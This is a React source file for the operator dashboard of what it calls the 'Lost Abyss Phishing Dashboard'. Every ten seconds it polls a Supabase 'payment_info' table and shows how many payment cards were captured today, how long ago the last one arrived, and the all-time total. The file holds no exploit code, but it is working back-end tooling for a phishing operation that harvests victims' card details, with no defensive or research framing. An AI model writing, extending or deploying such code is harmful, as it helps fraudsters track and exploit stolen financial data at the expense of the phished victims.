'use client';

import { useEffect, useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { supabase } from '@/lib/supabase';

export default function DashboardHome() {
  const [todayCount, setTodayCount] = useState<number>(0);
  const [lastResult, setLastResult] = useState<string | null>(null);
  const [totalCards, setTotalCards] = useState<number>(0);
  const [loading, setLoading] = useState(true);
  const [now, setNow] = useState(new Date());

  useEffect(() => {
    async function fetchData() {
      try {
        // Get today's date at midnight UTC
        const today = new Date();
        today.setUTCHours(0, 0, 0, 0);

        // Fetch today's count
        const { count: todayCardCount, error: countError } = await supabase
          .from('payment_info')
          .select('*', { count: 'exact', head: true })
          .gte('created_at', today.toISOString());

        if (countError) throw countError;
        setTodayCount(todayCardCount || 0);

        // Fetch last result
        const { data: lastCard, error: lastError } = await supabase
          .from('payment_info')
          .select('created_at')
          .order('created_at', { ascending: false })
          .limit(1)
          .single();

        if (lastError) throw lastError;
        setLastResult(lastCard?.created_at || null);

        // Fetch total cards count
        const { count: totalCount, error: totalError } = await supabase
          .from('payment_info')
          .select('*', { count: 'exact', head: true });

        if (totalError) throw totalError;
        setTotalCards(totalCount || 0);
      } catch (error) {
        console.error('Error fetching data:', error);
        setTodayCount(0);
        setLastResult(null);
        setTotalCards(0);
      } finally {
        setLoading(false);
      }
    }

    fetchData();

    // Set up intervals for data refresh and time updates
    const dataInterval = setInterval(fetchData, 10000); // Refresh data every 10 seconds
    const timeInterval = setInterval(() => setNow(new Date()), 1000); // Update time every second

    return () => {
      clearInterval(dataInterval);
      clearInterval(timeInterval);
    };
  }, []);

  const formatLastResult = (timestamp: string | null) => {
    if (!timestamp) return 'No results yet';
    const date = new Date(timestamp);
    
    // Calculate the difference in milliseconds
    const diff = now.getTime() - date.getTime();
    
    // Convert to minutes and seconds
    const minutes = Math.floor(diff / 60000);
    const seconds = Math.floor((diff % 60000) / 1000);
    
    if (minutes === 0) {
      return `${seconds} second${seconds !== 1 ? 's' : ''} ago`;
    }
    
    return `${minutes} minute${minutes !== 1 ? 's' : ''} ${seconds} second${seconds !== 1 ? 's' : ''} ago`;
  };

  return (
    <div className="space-y-6">
      <div className="space-y-1">
        <p className="text-sm font-medium text-muted-foreground">Welcome To</p>
        <h1 className="text-3xl font-bold">Lost Abyss Phishing Dashboard</h1>
      </div>
      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        <Card className="bg-card">
          <CardHeader>
            <CardTitle>Today's Results</CardTitle>
            <CardDescription>Cards added today</CardDescription>
          </CardHeader>
          <CardContent>
            <p className="text-3xl font-bold">
              {loading ? '...' : todayCount}
            </p>
          </CardContent>
        </Card>
        <Card className="bg-card">
          <CardHeader>
            <CardTitle>Last Result</CardTitle>
            <CardDescription>Most recent card added</CardDescription>
          </CardHeader>
          <CardContent>
            <p className="text-xl font-medium">
              {loading ? '...' : formatLastResult(lastResult)}
            </p>
          </CardContent>
        </Card>
        <Card className="bg-card">
          <CardHeader>
            <CardTitle>Total Cards</CardTitle>
            <CardDescription>All time total</CardDescription>
          </CardHeader>
          <CardContent>
            <p className="text-3xl font-bold">
              {loading ? '...' : totalCards}
            </p>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}